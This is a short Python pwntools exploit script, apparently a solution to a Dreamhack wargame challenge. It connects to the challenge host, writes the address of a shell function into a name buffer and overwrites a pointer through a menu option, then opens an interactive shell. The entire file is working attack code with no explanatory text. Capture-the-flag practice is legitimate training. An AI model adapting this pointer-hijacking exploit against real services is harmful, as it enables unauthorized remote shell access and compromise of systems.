from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 12649
r = remote(HOST, PORT)

sh=0x40094a
name=0x6010d0

r.sendlineafter(b': ', p64(sh))
r.sendlineafter(b'> ', b'4')
r.sendlineafter(b': ', p64(name-0x38))
r.sendlineafter(b'> ', b'2')

r.interactive()